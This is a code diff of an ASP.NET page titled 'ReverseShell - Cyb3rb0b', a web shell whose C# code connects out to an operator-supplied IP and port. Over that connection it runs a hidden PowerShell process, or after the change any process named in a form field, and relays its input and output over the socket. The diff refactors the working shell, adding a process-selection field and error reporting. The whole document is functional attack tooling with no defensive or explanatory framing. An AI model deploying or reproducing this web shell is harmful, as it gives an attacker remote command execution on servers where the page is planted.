@@ -11,32 +11,39 @@
 
 
 <html>
-    <head>
-        <title>ReverseShell - Cyb3rb0b</title>
-    </head>
-    <script language="c#" runat="server">
-        static StreamWriter streamWriter;
+<head>
+    <title>ReverseShell - Cyb3rb0b</title>
+</head>
+<script language="c#" runat="server">
+    private StreamWriter streamWriter;
 
-        protected void Button1_Click(object sender, System.EventArgs e){
-          
-
-            this.Connect();
+    void Page_Load(object sender, EventArgs e)
+    {
+        if (!this.IsPostBack)
+        {
+            // Start();
         }
 
-        void Connect(){
+    }
 
-            using(TcpClient client = new TcpClient(this.txtIp.Text, int.Parse(this.txtPort.Text)))
+    private void Start()
+    {
+        try
+        {
+            int port = int.Parse(this.txtPort.Text);
+            string address = this.txtIp.Text;
+            using (TcpClient client = new TcpClient(address.Trim(), port))
             {
-                using(Stream stream = client.GetStream())
+                using (Stream stream = client.GetStream())
                 {
-                    using(StreamReader rdr = new StreamReader(stream))
+                    using (StreamReader rdr = new StreamReader(stream))
                     {
                         streamWriter = new StreamWriter(stream);
 
                         StringBuilder strInput = new StringBuilder();
 
                         Process p = new Process();
-                        p.StartInfo.FileName = "powershell.exe";
+                        p.StartInfo.FileName = this.txtProcess.Text.Trim();
                         p.StartInfo.CreateNoWindow = true;
                         p.StartInfo.UseShellExecute = false;
                         p.StartInfo.RedirectStandardOutput = true;
@@ -46,7 +53,7 @@
                         p.Start();
                         p.BeginOutputReadLine();
 
-                        while(true)
+                        while (true)
                         {
                             strInput.Append(rdr.ReadLine());
                             //strInput.Append("\n");
@@ -57,51 +64,75 @@
                 }
             }
         }
-
-        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        catch (Exception ex)
         {
-            StringBuilder strOutput = new StringBuilder();
+            Response.Write(ex.ToString());
+        }
+    }
 
-            if (!String.IsNullOrEmpty(outLine.Data))
+    private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+    {
+        StringBuilder strOutput = new StringBuilder();
+
+        if (!String.IsNullOrEmpty(outLine.Data))
+        {
+            try
             {
-                try
-                {
-                    strOutput.Append(outLine.Data);
-                    streamWriter.WriteLine(strOutput);
-                    streamWriter.Flush();
-                }
-                catch (Exception err) { }
+                strOutput.Append(outLine.Data);
+                streamWriter.WriteLine(strOutput);
+                streamWriter.Flush();
+            }
+            catch (Exception err) {
+                Response.Write(err.ToString());
             }
         }
+    }
 
-        </script>
-    <body>
-        <form id="form" runat="server">
-            <table>
-                <tr>
-                    <td>
-                        IP
-                    </td>
-                    <td>
-                        <asp:TextBox ID="txtIp" runat="server"></asp:TextBox>
-                    </td>
-                </tr>
-                <tr>
-                    <td>
-                        Port
-                    </td>
-                    <td>
-                        <asp:TextBox ID="txtPort" runat="server"></asp:TextBox>
-                    </td>
-                </tr>
-                <tr>
-                    <td colspan="2">
-                        <asp:Button ID="Button1" runat="server" Text="Connect" OnClick="Button1_Click" />
-                    </td>
-                </tr>
-            </table>
-            
-        </form>
 
-    </body>
+    protected void Button1_Click(object sender, EventArgs e)
+    {
+        try
+        {
+            Start();
+        }
+        catch (Exception err) {
+            Response.Write(err.ToString());
+        }
+
+    }
+</script>
+<body>
+    <form id="form" runat="server">
+        <table>
+            <tr>
+                <td>IP
+                </td>
+                <td>
+                    <asp:TextBox ID="txtIp" runat="server"></asp:TextBox>
+                </td>
+            </tr>
+            <tr>
+                <td>Port
+                </td>
+                <td>
+                    <asp:TextBox ID="txtPort" runat="server"></asp:TextBox>
+                </td>
+            </tr>
+            <tr>
+                <td>Port
+                </td>
+                <td>
+                    <asp:TextBox ID="txtProcess" runat="server"></asp:TextBox>
+                </td>
+            </tr>
+            <tr>
+                <td colspan="2">
+                    <asp:Button ID="Button1" runat="server" Text="Connect" OnClick="Button1_Click" />
+                </td>
+            </tr>
+        </table>
+
+    </form>
+
+</body>
 </html>
